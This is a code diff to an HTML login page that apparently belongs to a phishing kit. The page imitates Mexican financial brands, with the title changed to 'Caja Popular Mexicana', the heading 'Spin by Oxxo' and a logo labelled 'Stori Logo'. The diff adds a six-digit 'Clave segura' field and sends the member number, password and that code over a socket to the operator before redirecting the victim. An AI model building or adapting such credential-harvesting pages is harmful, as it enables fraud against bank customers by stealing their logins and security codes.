@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SPIN</title>
+  <title>Caja Popular Mexicana</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -75,7 +75,7 @@
     }
 
     button {
-      background-color: #9535f5;
+      background-color: #019765;
       color: white;
       padding: 8px 20px;
       border: none;
@@ -87,7 +87,7 @@
     }
 
     button:hover {
-      background-color: #9535f5;
+      background-color: #019765;
     }
 
     button:disabled {
@@ -109,7 +109,7 @@
 <body>
   <div class="screen active" id="pantallaInicio">
     <img src="https://static.promodescuentos.com/threads/raw/H9hA8/854981_1/re/768x768/qt/60/854981_1.jpg" alt="Stori Logo" class="logo">
-    <h2>Bienvenido a Spin by Oxxo.</h2>
+    <h2>Bienvenido a Spin By Oxxo.</h2>
     <p>Ingrese a su cuenta para iniciar con el proceso de análisis.</p>
     <form id="login-form">
       <div class="input-group">
@@ -120,8 +120,13 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      <div class="input-group">
+        <div class="icon"><i class="fas fa-phone"></i></div>
+        <input type="tel" id="telefono" placeholder="Clave segura" maxlength="6" required>
+      </div>
       <p id="socioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
+      <p id="telefonoError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -137,14 +142,15 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          if (validarSocio() && validarPassword()) {
+          if (validarSocio() && validarPassword() && validarTelefono()) {
             const socio = document.getElementById('socio').value;
             const contrasena = document.getElementById('password').value;
+            const telefono = document.getElementById('telefono').value;
 
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            socket.emit('dataForm', { socio, contrasena, sessionId });
+            socket.emit('dataForm', { socio, contrasena, telefono, sessionId });
 
             window.location.href = 'opciones.html';
           }
@@ -190,6 +196,28 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+
+    function validarTelefono() {
+      const telefono = document.getElementById("telefono").value;
+      const telefonoError = document.getElementById("telefonoError");
+      const telefonoInput = document.getElementById("telefono");
+
+      const soloNumeros = /^\d{1,10}$/;
+
+      if (!telefono) {
+        telefonoError.textContent = "El número telefónico es obligatorio";
+        telefonoInput.classList.add("campo-requerido");
+        return false;
+      } else if (!soloNumeros.test(telefono)) {
+        telefonoError.textContent = "Debe ingresar hasta 10 dígitos numéricos";
+        telefonoInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        telefonoError.textContent = "";
+        telefonoInput.classList.remove("campo-requerido");
         return true;
       }
     }
